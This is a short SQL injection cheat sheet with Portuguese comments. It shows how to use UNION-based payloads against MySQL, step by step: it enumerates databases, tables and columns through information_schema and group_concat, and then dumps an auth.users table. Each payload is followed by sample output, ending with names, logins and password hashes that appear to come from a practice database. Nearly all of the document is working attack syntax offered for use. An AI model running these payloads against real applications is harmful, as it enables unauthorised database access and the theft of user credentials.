# "Syntax"

Databases
---

```sql
group_concat(schema_name)
```

Tables
---

```sql
group_concat(table_name)
```

Columns
---

```sql
group_concat(column_name)
```

information_schema
---
	- schemata -> todos os nomes de bancos
	- tables   -> todos os nomes de tabelas
	- columns  -> todos os nomes de colunas 

## EXAMPLES

To get databases
---

```sql
-1 union select 1,2,3,group_concat(schema_name) from information_schema.schemata;
```

```
+----+------+-------+--------------------------------------------------+
| id | name | login | password                                         |
+----+------+-------+--------------------------------------------------+
|  1 | 2    | 3     | information_schema,performance_schema,mysql,auth |
+----+------+-------+--------------------------------------------------+
```

To get tables
---

```sql
-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema="auth";
```

```
+----+------+-------+---------------+
| id | name | login | password      |
+----+------+-------+---------------+
|  1 | 2    | 3     | users,notices |
+----+------+-------+---------------+
```

To get columns
---

```sql
-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema="auth" and table_name="users"
```

```
+----+------+-------+------------------------+
| id | name | login | password               |
+----+------+-------+------------------------+
|  1 | 2    | 3     | id,name,login,password |
+----+------+-------+------------------------+
```

To dump data
---

```sql
-1 union select * from auth.users;
```

```
+----+-----------------+---------+----------------------------------+
| id | name            | login   | password                         |
+----+-----------------+---------+----------------------------------+
|  1 | Joseff Bernards | joseff  | 95ae4ae00fa7a0c403333a60bad023d1 |
|  2 | Antonio Moura   | antonio | cf9bfe8ec50083c8cb3512230b8fb667 |
|  3 | Maria Sousa     | maria   | 0e3cb90d820186431cedb36aaed36bbb |
+----+-----------------+---------+----------------------------------+
```
